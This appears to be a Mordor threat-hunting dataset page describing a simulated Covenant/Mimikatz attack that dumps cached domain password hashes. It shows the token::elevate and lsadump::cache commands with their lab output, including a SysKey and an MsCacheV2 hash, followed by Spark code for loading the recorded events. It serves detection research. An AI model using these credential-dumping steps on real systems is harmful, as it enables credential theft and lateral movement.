# Covenant Mimikatz LSA Cache

## Metadata


|                       |    |
|:----------------------|:---|
| id                    | SDWIN-191205043030 |
| author                | Roberto Rodriguez @Cyb3rWard0g |
| creation date         | 2019/12/05 |
| platform              | Windows |
| Tactic(s)             | ['[TA0006](https://attack.mitre.org/tactics/TA0006)'] |
| Technique(s)          | ['[T1003.004](https://attack.mitre.org/techniques/T1003/004)'] |
| Simulaton Environment | Mordor shire |
| Simulation Scripts    | ['https://github.com/cobbr/SharpSploit/blob/master/SharpSploit/Credentials/Mimikatz.cs'] |
| Dataset           | https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/credential_access/covenant_lsacache.tar.gz |
| References        | None |

## Dataset Description
This dataset represents adversaries using Mimikatz to exract cached password hashes from HKEY_LOCAL_MACHINE\SECURITY\Cache

## Adversary View
```
.#####.   mimikatz 2.2.0 (x64) #18362 Oct  8 2019 14:30:39
.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
## \ / ##       > http://blog.gentilkiwi.com/mimikatz
'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
'#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # token::elevate
Token Id  : 0
User name : 
SID name  : NT AUTHORITY\SYSTEM

760	{0;000003e7} 1 D 26049     	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Primary
  -> Impersonated !
  * Process Token : {0;000764fd} 1 F 7191206   	shire\pgustavo	S-1-5-21-791464340-1796667228-2788435825-1112	(17g,24p)	Primary
  * Thread Token  : {0;000003e7} 1 D 8355744   	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Impersonation (Delegation)

mimikatz(powershell) # lsadump::cache
Domain : IT001
SysKey : 4723683e5d919d0170ffd5a4c2b137fa

Local name : IT001 ( S-1-5-21-2036226717-1704707055-511440364 )
Domain name : shire ( S-1-5-21-791464340-1796667228-2788435825 )
Domain FQDN : shire.com

Policy subsystem is : 1.18
LSA Key(s) : 1, default {8b36cbca-d3e7-f8bc-d903-ff9728f21c92}
  [00] {8b36cbca-d3e7-f8bc-d903-ff9728f21c92} db4d026436543ae43b751a1085e7dbe6e560be5dc2ed67e326aefb1c79127025

* Iteration is set to default (10240)

[NL$1 - 12/4/2019 8:02:03 PM]
RID       : 00000458 (1112)
User      : shire\pgustavo
MsCacheV2 : 4d335711a0a835a152e2783a51dfb92c
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/credential_access/covenant_lsacache.tar.gz"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT *
FROM mordorTable
    '''
)
df.printSchema()
        